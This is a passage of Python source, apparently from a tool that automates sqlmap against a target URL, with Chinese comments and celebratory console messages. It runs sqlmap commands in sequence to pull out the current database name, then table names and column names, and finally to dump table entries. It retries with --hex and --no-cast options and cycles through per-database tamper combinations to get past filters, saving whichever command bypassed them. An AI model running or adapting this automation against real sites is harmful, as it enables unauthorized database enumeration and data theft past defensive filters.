                    if self.sm_no_cast_command + " --current-db" + " --technique=USE" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_no_cast_command + " --current-db" + " --technique=USE")
                        current_finished_command_list.append(
                            self.sm_no_cast_command + " --current-db" + " --technique=USE")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名", 'red')
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'hex_or_no_cast', ['--no-cast'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_no_cast_command + " --current-db" + " --technique=BQT" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(
                        self.sm_no_cast_command + " --current-db" + " --technique=BQT")
                    current_finished_command_list.append(
                        self.sm_no_cast_command + " --current-db" + " --technique=BQT")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    db_name_list = self.get_db_name_from_log_file(self.log_file)
                    if db_name_list != 0 and db_name_list != []:
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前url的数据库名", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前hex_or_no_cast的值不为空,没有检测到该用--hex还是--no-cast
                # 当前get_db_name_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + " --current-db" + " --technique=USE"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                        current_finished_command_list.append(sm_hex_or_no_cast_command)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])

                        db_name_list = self.get_db_name_from_log_file(self.log_file)
                        if db_name_list != 0 and db_name_list != []:
                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库名" % hex_or_no_cast, 'red')
                            return 1

                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + " --current-db" + " --technique=BQT"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                    current_finished_command_list.append(sm_hex_or_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'hex_or_no_cast', ['--no-cast'])

                    db_name_list = self.get_db_name_from_log_file(self.log_file)
                    if db_name_list != 0 and db_name_list != []:
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前url的数据库名" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前url的数据库名...", 'green')
            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
            # 先判断返回是否为0
            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
            if db_type == 'MYSQL':
                db_type_tamper_list = self.MYSQL
            elif db_type == 'MSSQL':
                db_type_tamper_list = self.MSSQL
            elif db_type == 'ORACLE':
                db_type_tamper_list = self.ORACLE
            elif db_type == 'ACCESS':
                db_type_tamper_list = self.ACCESS
            elif db_type == 'SQLITE':
                db_type_tamper_list = self.SQLITE
            elif db_type == 'PGSQL':
                db_type_tamper_list = self.PGSQL
            elif db_type == 'DB2':
                db_type_tamper_list = self.DB2
            elif db_type == 'FIREBIRD':
                db_type_tamper_list = self.FIREBIRD
            elif db_type == 'MAXDB':
                db_type_tamper_list = self.MAXDB
            elif db_type == 'SYBASE':
                db_type_tamper_list = self.SYBASE
            elif db_type == 'HSQLDB':
                db_type_tamper_list = self.HSQLDB
            else:
                print("impossile! check get_db_name_need_tamper func ")

            # 下面为了得到当前url的数据库名而进行run_all_comb
            make_it = self.run_all_comb(db_type_tamper_list, 'db_name')
            if make_it == 1:
                # 下面代表已经获取了db_name对应的tamper
                return 1

            # 下面代表尝试完当前的动作依然没有得到当前url的数据库名
            return 0

    def get_table_name_need_tamper(self):
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        # 获得表名需要的tamper
        self.output.good_print("目前为止已经尝试完获取当前url的数据库名,现在尝试获取当前数据库的表名...", 'green')
        table_name = self.get_table_name_from_log_file(self.log_file)

        if table_name != 0 and table_name != "":
            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表名了,以前已经得到过了", 'red')
            return 1
        else:
            # 之前没有得到数据库表名,现在尝试所有的组合tamper获取数据库表名,直到所有组合的tamper尝试完毕
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                # 尝试不用--hex或--no-cast获取表名
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command + " --technique=USE" + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_command + " --technique=USE" + " --tables")
                        current_finished_command_list.append(
                            self.sm_command + " --technique=USE" + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了", 'red')
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(
                        self.sm_command + " --technique=BQT" + " --tables")
                    current_finished_command_list.append(
                        self.sm_command + " --technique=BQT" + " --tables")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    table_name = self.get_table_name_from_log_file(self.log_file)
                    if table_name != 0 and table_name != "":
                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库表名了", 'red')
                        return 1

                self.output.good_print("尝试用--hex选项再获取当前数据库的表名...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command + " --technique=USE" + " --tables" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(
                            self.sm_hex_command + " --technique=USE" + " --tables")
                        current_finished_command_list.append(
                            self.sm_hex_command + " --technique=USE" + " --tables")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名", 'red')
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command + " --technique=BQT" + " --tables" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(
                        self.sm_hex_command + " --technique=BQT" + " --tables")
                    current_finished_command_list.append(
                        self.sm_hex_command + " --technique=BQT" + " --tables")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    table_name = self.get_table_name_from_log_file(self.log_file)
                    if table_name != 0 and table_name != "":
                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表名", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表名...", 'green')
                if self.has_good_sqli_type == 1:
                    cmd = self.sm_no_cast_command + " --technique=USE" + " --tables"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if cmd in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(cmd)
                        current_finished_command_list.append(cmd)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名", 'red')
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'hex_or_no_cast', ['--no-cast'])
                            return 1

                cmd = self.sm_no_cast_command + " --technique=BQT" + " --tables"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if cmd in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(cmd)
                    current_finished_command_list.append(cmd)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    table_name = self.get_table_name_from_log_file(self.log_file)
                    if table_name != 0 and table_name != "":
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表名", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前hex_or_no_cast的值不为空,没有检测到该用--hex还是--no-cast
                # 当前get_table_name_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                        " --technique=USE" + " --tables"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                        current_finished_command_list.append(sm_hex_or_no_cast_command)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        table_name = self.get_table_name_from_log_file(self.log_file)
                        if table_name != 0 and table_name != "":
                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表名" %
                                                   hex_or_no_cast, 'red')
                            return 1

                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                    " --technique=BQT" + " --tables"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                    current_finished_command_list.append(sm_hex_or_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    table_name = self.get_table_name_from_log_file(self.log_file)
                    if table_name != 0 and table_name != "":
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表名" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表名...", 'green')
            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
            # 先判断返回是否为0
            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
            if db_type == 'MYSQL':
                db_type_tamper_list = self.MYSQL
            elif db_type == 'MSSQL':
                db_type_tamper_list = self.MSSQL
            elif db_type == 'ORACLE':
                db_type_tamper_list = self.ORACLE
            elif db_type == 'ACCESS':
                db_type_tamper_list = self.ACCESS
            elif db_type == 'SQLITE':
                db_type_tamper_list = self.SQLITE
            elif db_type == 'PGSQL':
                db_type_tamper_list = self.PGSQL
            elif db_type == 'DB2':
                db_type_tamper_list = self.DB2
            elif db_type == 'FIREBIRD':
                db_type_tamper_list = self.FIREBIRD
            elif db_type == 'MAXDB':
                db_type_tamper_list = self.MAXDB
            elif db_type == 'SYBASE':
                db_type_tamper_list = self.SYBASE
            elif db_type == 'HSQLDB':
                db_type_tamper_list = self.HSQLDB
            else:
                print("impossile! check get_table_name_need_tamper func ")

            # 下面为了得到当前url的数据库名而进行run_all_comb
            make_it = self.run_all_comb(db_type_tamper_list, 'table_name')
            if make_it == 1:
                # 下面代表已经获取了有table_name对应的tamper
                return 1

            # 下面代表尝试完当前的动作依然没有得到当前url的数据库名
            return 0

    def get_column_name_need_tamper(self):
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        self.output.good_print("目前为止已经尝试完获取当前数据库的表名,现在尝试获取当前数据库的表的列名...", 'red')
        # 当前已经获得的表名,如下table_name
        table_name = self.get_table_name_from_log_file(self.log_file)
        has_column_name = self.get_column_name_from_log_file(self.log_file)
        if has_column_name == 1:
            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名了,以前已经得到过了", 'red')
            return 1
        else:
            # 之前没有得到数据库的表的列名,现在尝试所有的组合tamper获取数据库的表的列名,直到所有组合的tamper尝试完毕
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                # 尝试不用--hex或--no-cast获取表名
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            self.sm_command + " --technique=USE" + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了", 'red')
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --columns")
                    current_finished_command_list.append(
                        self.sm_command + " --technique=BQT" + " -T " + table_name + " --columns")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_column_name = self.get_column_name_from_log_file(self.log_file)
                    if has_column_name == 1:
                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名了", 'red')
                        return 1

                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名", 'red')
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --columns")
                    current_finished_command_list.append(
                        self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --columns")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_column_name = self.get_column_name_from_log_file(self.log_file)
                    if has_column_name == 1:
                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --columns")
                        current_finished_command_list.append(
                            self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --columns")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名", 'red')
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'hex_or_no_cast', ['--no-cast'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --columns")
                    current_finished_command_list.append(
                        self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --columns")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_column_name = self.get_column_name_from_log_file(self.log_file)
                    if has_column_name == 1:
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前hex_or_no_cast的值不为空,没有检测到该用--hex还是--no-cast
                # 当前get_table_name_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
                hex_or_no_cast = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'hex_or_no_cast'))[0]
                if self.has_good_sqli_type == 1:
                    sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                        " --technique=USE" + " -T " + table_name + " --columns"
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if sm_hex_or_no_cast_command in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                        current_finished_command_list.append(sm_hex_or_no_cast_command)
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_column_name = self.get_column_name_from_log_file(self.log_file)
                        if has_column_name == 1:
                            self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名" % hex_or_no_cast, 'red')
                            return 1

                sm_hex_or_no_cast_command = self.sm_command + " " + hex_or_no_cast + \
                    " --technique=BQT" + " -T " + table_name + " --columns"
                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if sm_hex_or_no_cast_command in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(sm_hex_or_no_cast_command)
                    current_finished_command_list.append(sm_hex_or_no_cast_command)
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_column_name = self.get_column_name_from_log_file(self.log_file)
                    if has_column_name == 1:
                        self.output.good_print("恭喜大爷!!! 使用已经得到的%s选项检测到了当前数据库的表的列名" %
                                               hex_or_no_cast, 'red')
                        return 1

            self.output.good_print("--hex和--no-cast无果,正在尝试使用每一个组合tamper获取当前数据库的表的列名...", 'green')
            # 在经历get_db_type_need_tamper函数之后将db_type的结果保存在了config_file中，log_file中也可获取,但要
            # 先判断返回是否为0
            db_type = eval(get_key_value_from_config_file(self.log_config_file, 'default', 'db_type'))
            if db_type == 'MYSQL':
                db_type_tamper_list = self.MYSQL
            elif db_type == 'MSSQL':
                db_type_tamper_list = self.MSSQL
            elif db_type == 'ORACLE':
                db_type_tamper_list = self.ORACLE
            elif db_type == 'ACCESS':
                db_type_tamper_list = self.ACCESS
            elif db_type == 'SQLITE':
                db_type_tamper_list = self.SQLITE
            elif db_type == 'PGSQL':
                db_type_tamper_list = self.PGSQL
            elif db_type == 'DB2':
                db_type_tamper_list = self.DB2
            elif db_type == 'FIREBIRD':
                db_type_tamper_list = self.FIREBIRD
            elif db_type == 'MAXDB':
                db_type_tamper_list = self.MAXDB
            elif db_type == 'SYBASE':
                db_type_tamper_list = self.SYBASE
            elif db_type == 'HSQLDB':
                db_type_tamper_list = self.HSQLDB
            else:
                print("impossile! check get_column_name_need_tamper func ")

            # 下面为了得到当前url的数据库的表的列名而进行run_all_comb
            make_it = self.run_all_comb(db_type_tamper_list, 'column_name')
            if make_it == 1:
                # 下面代表已经获取了有table_name对应的tamper
                return 1

            # 下面代表尝试完当前的动作依然没有得到当前url的数据库的表的列名
            return 0

    def get_entries_need_tamper(self):
        # run_all_comb中的test_tamper_string函数中是有tamper的包括--hex和--no-cast的检测
        # 当前get_(for_what)_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
        self.output.good_print("目前为止已经尝试完获取当前数据库的表的列名,现在尝试获取当前数据库的表的列名的具体数据...", 'red')
        # 当前已经获得的表名,如下table_name
        table_name = self.get_table_name_from_log_file(self.log_file)
        has_entries = self.get_entries_from_log_file(self.log_file)
        if has_entries == 1:
            self.output.good_print("恭喜大爷,不用进入这个函数尝试获取数据库的表的列名的具体数据了,以前已经得到过了", 'red')
            return 1
        else:
            # 之前没有得到数据库的表的列名的具体数据,现在尝试所有的组合tamper获取数据库的表的列名的具体数据,直到所有组合的tamper尝试完毕
            if eval(get_key_value_from_config_file(self.log_config_file, 'default', 'hex_or_no_cast')) == []:
                # 当前hex_or_no_cast的值为空,没有检测到该用--hex还是--no-cast
                # 尝试不用--hex或--no-cast获取表名
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         self.sm_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了", 'red')
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --dump --stop 3")
                    current_finished_command_list.append(
                        self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_entries = self.get_entries_from_log_file(self.log_file)
                    if has_entries == 1:
                        update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                     self.sm_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                        self.output.good_print("恭喜大爷,不用--hex或者--no-cast就获得了数据库的表的列名的具体数据了", 'red')
                        return 1

                self.output.good_print("尝试用--hex选项再获取当前数据库的表的列名的具体数据...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         self.sm_hex_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据", 'red')
                            update_config_file_key_value(
                                self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_hex_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --dump --stop 3")
                    current_finished_command_list.append(
                        self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_entries = self.get_entries_from_log_file(self.log_file)
                    if has_entries == 1:
                        update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                     self.sm_hex_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                        self.output.good_print("恭喜大爷!!! 使用--hex成功得到了当前数据库的表的列名的具体数据", 'red')
                        update_config_file_key_value(
                            self.log_config_file, 'default', 'hex_or_no_cast', ['--hex'])
                        return 1

                self.output.good_print("尝试用--no-cast选项再获取当前数据库的表的列名的具体数据...", 'green')
                if self.has_good_sqli_type == 1:
                    current_finished_command_list = eval(get_key_value_from_config_file(
                        self.log_config_file, 'default', 'finished_command_list'))
                    if self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                        pass
                    else:
                        self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=USE" + 
                                                                 " -T " + table_name + " --dump --stop 3")
                        current_finished_command_list.append(
                            self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3")
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'finished_command_list', current_finished_command_list)

                        has_entries = self.get_entries_from_log_file(self.log_file)
                        if has_entries == 1:
                            update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                         self.sm_no_cast_command + " --technique=USE" + " -T " + table_name + " --dump --stop 3"])
                            self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据", 'red')
                            update_config_file_key_value(self.log_config_file, 'default',
                                                         'hex_or_no_cast', ['--no-cast'])
                            return 1

                current_finished_command_list = eval(get_key_value_from_config_file(
                    self.log_config_file, 'default', 'finished_command_list'))
                if self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3" in current_finished_command_list:
                    pass
                else:
                    self.output.os_system_combine_argv_with_bottom_status(self.sm_no_cast_command + " --technique=BQT" + 
                                                             " -T " + table_name + " --dump --stop 3")
                    current_finished_command_list.append(
                        self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3")
                    update_config_file_key_value(self.log_config_file, 'default',
                                                 'finished_command_list', current_finished_command_list)

                    has_entries = self.get_entries_from_log_file(self.log_file)
                    if has_entries == 1:
                        update_config_file_key_value(self.log_config_file, 'default', 'bypassed_command', [
                                                     self.sm_no_cast_command + " --technique=BQT" + " -T " + table_name + " --dump --stop 3"])
                        self.output.good_print("恭喜大爷!!! 使用--no-cast成功得到了当前数据库的表的列名的具体数据", 'red')
                        update_config_file_key_value(self.log_config_file, 'default',
                                                     'hex_or_no_cast', ['--no-cast'])
                        return 1
            else:
                # 当前hex_or_no_cast的值不为空,没有检测到该用--hex还是--no-cast
                # 当前get_table_name_need_tamper函数主体代码中是没有tamper的包括--hex和--no-cast的检测
